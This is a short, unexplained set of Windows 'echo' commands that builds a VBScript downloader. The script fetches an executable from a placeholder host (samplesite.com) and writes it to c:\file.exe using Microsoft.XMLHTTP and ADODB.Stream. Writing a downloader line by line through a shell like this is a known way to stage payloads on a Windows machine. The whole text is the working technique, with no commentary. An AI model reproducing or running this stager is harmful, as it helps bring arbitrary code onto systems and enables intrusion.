echo Dim DataBin>c:\madefile.vbs
echo Dim HTTPGET>>c:\madefile.vbs
echo Set HTTPGET = CreateObject("Microsoft.XMLHTTP")>>c:\madefile.vbs
echo HTTPGET.Open "GET", "http://www.samplesite.com/file.exe", False>>c:\madefile.vbs
echo HTTPGET.Send>>c:\madefile.vbs
echo DataBin = HTTPGET.ResponseBody>>c:\madefile.vbs
echo Const adTypeBinary=1>>c:\madefile.vbs
echo Const adSaveCreateOverWrite=2>>c:\madefile.vbs
echo Dim SendBinary>>c:\madefile.vbs
echo Set SendBinary = CreateObject("ADODB.Stream")>>c:\madefile.vbs
echo SendBinary.Type = adTypeBinary>>c:\madefile.vbs
echo SendBinary.Open>>c:\madefile.vbs
echo SendBinary.Write DataBin>>c:\madefile.vbs
echo SendBinary.SaveToFile "c:\file.exe", adSaveCreateOverWrite>>c:\madefile.vbs